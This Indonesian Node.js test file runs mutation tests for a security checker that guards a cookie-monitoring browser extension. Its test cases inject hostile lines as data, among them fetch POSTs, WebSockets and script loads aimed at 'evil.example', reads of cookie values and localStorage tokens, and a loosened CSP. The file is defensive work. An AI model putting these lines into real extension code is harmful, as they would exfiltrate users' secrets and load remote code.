// Menguji alat periksa-keamanan.js: harus lolos pada kode asli dan GAGAL pada tiap perubahan berbahaya.
const fs = require('fs'), path = require('path'), cp = require('child_process');
const ASLI = require('path').resolve(__dirname, '..'), TMP = require('os').tmpdir() + '/pemantau-mutasi';
function salin() {
  fs.rmSync(TMP, { recursive: true, force: true }); fs.mkdirSync(TMP, { recursive: true });
  for (const n of fs.readdirSync(ASLI)) if (n !== '.git') fs.cpSync(path.join(ASLI, n), path.join(TMP, n), { recursive: true });
}
function jalan() { const r = cp.spawnSync(process.execPath, ['periksa-keamanan.js'], { cwd: TMP, encoding: 'utf8' }); return { kode: r.status, keluar: r.stdout }; }
const manifest = (f) => () => { const p = TMP + '/manifest.json'; const m = JSON.parse(fs.readFileSync(p, 'utf8')); f(m); fs.writeFileSync(p, JSON.stringify(m)); };
const tambah = (berkas, teks) => () => fs.appendFileSync(TMP + '/' + berkas, '\n' + teks + '\n');
const ganti = (berkas, a, b) => () => { const p = TMP + '/' + berkas; const s = fs.readFileSync(p, 'utf8'); if (!s.includes(a)) throw new Error('tidak ketemu: ' + a); fs.writeFileSync(p, s.replace(a, b)); };

const kasus = [
  ['KONTROL: kode asli lolos', () => {}, 0, /Lolos/],
  ['KONTROL: kata "fetch(" di komentar tidak dihitung', tambah('background.js', '// fetch("https://x") eval( innerHTML'), 0, /Lolos/],
  ['izin "tabs" ditambah', manifest((m) => m.permissions.push('tabs')), 1, /Izin baru.*tabs/],
  ['izin "history" ditambah', manifest((m) => m.permissions.push('history')), 1, /history/],
  ['izin "management" jadi wajib (bukan opsional)', manifest((m) => m.permissions.push('management')), 1, /management/],
  ['izin opsional "debugger" ditambah', manifest((m) => m.optional_permissions.push('debugger')), 1, /Izin opsional baru/],
  ['host_permissions diganti', manifest((m) => (m.host_permissions = ['https://*/*'])), 1, /host_permissions berubah/],
  ['web_accessible_resources ditambah', manifest((m) => (m.web_accessible_resources = [{ resources: ['popup.html'], matches: ['<all_urls>'] }])), 1, /web_accessible_resources/],
  ['externally_connectable ditambah', manifest((m) => (m.externally_connectable = { matches: ['https://*/*'] })), 1, /externally_connectable/],
  ['content_scripts ditambah', manifest((m) => (m.content_scripts = [{ matches: ['<all_urls>'], js: ['popup.js'] }])), 1, /content_scripts/],
  ['update_url ditambah', manifest((m) => (m.update_url = 'https://evil.example/u.xml')), 1, /update_url/],
  ['CSP melonggar (unsafe-eval)', manifest((m) => (m.content_security_policy.extension_pages = "script-src 'self' 'unsafe-eval'; object-src 'self'")), 1, /melonggarkan/],
  ['CSP dihapus', manifest((m) => delete m.content_security_policy), 1, /harus memuat/],
  ['fetch() ke server luar', tambah('background.js', 'fetch("https://evil.example/kirim", { method: "POST" });'), 1, /fetch\(\)/],
  ['XMLHttpRequest', tambah('popup.js', 'const x = new XMLHttpRequest();'), 1, /XMLHttpRequest/],
  ['WebSocket', tambah('popup.js', 'const w = new WebSocket("wss://evil.example");'), 1, /WebSocket/],
  ['navigator.sendBeacon', tambah('popup.js', 'navigator.sendBeacon("/x", data);'), 1, /sendBeacon/],
  ['eval()', tambah('popup.js', 'eval("alert(1)");'), 1, /eval\(\)/],
  ['new Function', tambah('popup.js', 'const f = new Function("return 1");'), 1, /new Function/],
  ['innerHTML', tambah('popup.js', 'wadah.innerHTML = cookie.name;'), 1, /HTML mentah/],
  ['membaca NILAI cookie', tambah('background.js', 'const rahasia = cookie.value;'), 1, /NILAI cookie/],
  ['menulis cookie (cookies.set)', tambah('background.js', 'chrome.cookies.set({ url: "x", name: "a", value: "b" });'), 1, /cookies\.set/],
  ['penerima pesan (onMessage)', tambah('background.js', 'chrome.runtime.onMessage.addListener(() => {});'), 1, /pesan/],
  ['izin "browsingData" jadi wajib (bukan opsional)', manifest((m) => m.permissions.push('browsingData')), 1, /browsingData/],
  ['browsingData.remove tanpa batas alamat', tambah('background.js', 'chrome.browsingData.remove({ since: 0 }, { localStorage: true });'), 1, /tanpa batas alamat/],
  ['browsingData.removeHistory', tambah('background.js', 'chrome.browsingData.removeHistory({});'), 1, /hanya chrome\.browsingData\.remove/],
  ['browsingData menghapus riwayat', tambah('background.js', 'chrome.browsingData.remove({ origins: o }, { history: true });'), 1, /tidak boleh dihapus/],
  ['browsingData menghapus indexedDB', tambah('background.js', 'chrome.browsingData.remove({ origins: o }, { indexedDB: true });'), 1, /tidak boleh dihapus/],
  ['browsingData dipakai benar (kontrol, harus lolos)', tambah('background.js', 'chrome.browsingData.remove({ origins: o }, { localStorage: true });'), 0, /Lolos/],
  ['chrome.scripting.registerContentScripts', tambah('background.js', 'chrome.scripting.registerContentScripts([]);'), 1, /hanya executeScript/],
  ['executeScript memuat berkas (files)', tambah('umum.js', 'chrome.scripting.executeScript({ target: { tabId: 1 }, files: ["x.js"] });'), 1, /files/],
  ['executeScript di dunia MAIN', tambah('umum.js', 'chrome.scripting.executeScript({ target: { tabId: 1 }, world: "MAIN", func: () => 1 });'), 1, /world MAIN/],
  ['membaca NILAI localStorage (getItem)', tambah('umum.js', 'const r = () => localStorage.getItem("token");'), 1, /nilainya tidak boleh dibaca/],
  ['membaca semua isi localStorage', tambah('umum.js', 'const r = () => JSON.stringify(localStorage);'), 1, /nilainya tidak boleh dibaca/],
  ['membaca Object.entries(localStorage)', tambah('umum.js', 'const r = () => Object.entries(localStorage);'), 1, /nilainya tidak boleh dibaca/],
  ['membaca sessionStorage', tambah('umum.js', 'const r = () => sessionStorage.getItem("a");'), 1, /sessionStorage/],
  ['executeScript dipakai benar: baca nama + removeItem (kontrol, harus lolos)', tambah('umum.js', 'const r = () => Object.keys(localStorage); const h = (k) => localStorage.removeItem(k);'), 0, /Lolos/],
  ['izin opsional "scripting" boleh (kontrol)', manifest((m) => m.optional_permissions.includes('scripting') || m.optional_permissions.push('scripting')), 0, /Lolos/],
  ['izin "scripting" jadi wajib (bukan opsional)', manifest((m) => m.permissions.push('scripting')), 1, /scripting/],
  ['chrome.webRequest', tambah('background.js', 'chrome.webRequest.onBeforeRequest.addListener(() => {}, {urls: []});'), 1, /tidak dipakai proyek ini/],
  ['alamat https:// di luar umum.js', tambah('background.js', 'const a = "https://evil.example/x";'), 1, /di luar umum\.js/],
  ['alamat http:// tanpa enkripsi', tambah('umum.js', 'const b = "http://evil.example/x";'), 1, /http:\/\//],
  ['importScripts dari alamat luar', ganti('background.js', 'importScripts("bahasa.js", "umum.js", "ekstensi.js");', 'importScripts("https://evil.example/x.js");'), 1, /importScripts/],
  ['popup.html: event inline', ganti('popup.html', '<h1>Pemantau Cookies</h1>', '<h1 onclick="x()">Pemantau Cookies</h1>'), 1, /event inline/],
  ['popup.html: skrip dari luar', ganti('popup.html', '<script src="popup.js"></script>', '<script src="https://evil.example/x.js"></script><script src="popup.js"></script>'), 1, /alamat luar/],
  ['popup.html: <script> inline', ganti('popup.html', '<script src="popup.js"></script>', '<script>alert(1)</script><script src="popup.js"></script>'), 1, /inline/],
  ['popup.html: iframe', ganti('popup.html', '<h1>Pemantau Cookies</h1>', '<iframe src="x"></iframe><h1>Pemantau Cookies</h1>'), 1, /iframe/],
  ['file .exe ditambahkan', () => fs.writeFileSync(TMP + '/penyedot.exe', ''), 1, /berbahaya/],
  ['file .wasm ditambahkan', () => fs.writeFileSync(TMP + '/x.wasm', ''), 1, /berbahaya/],
];
let salah = 0;
for (const [nama, ubah, kodeHarus, pola] of kasus) {
  salin();
  let hasil;
  try { ubah(); hasil = jalan(); } catch (e) { hasil = { kode: -1, keluar: 'galat uji: ' + e.message }; }
  const ok = hasil.kode === kodeHarus && pola.test(hasil.keluar);
  if (!ok) salah++;
  console.log((ok ? 'LULUS  ' : 'GAGAL  ') + nama + (ok ? '' : '\n         kode=' + hasil.kode + ' keluaran=' + hasil.keluar.slice(-300)));
}
fs.rmSync(TMP, { recursive: true, force: true });
console.log('\n' + (salah === 0 ? 'UJI_PEMERIKSA_OK (' + kasus.length + ' kasus)' : 'UJI_PEMERIKSA_ADA_MASALAH ' + salah + '/' + kasus.length));
if (salah !== 0) process.exitCode = 1;
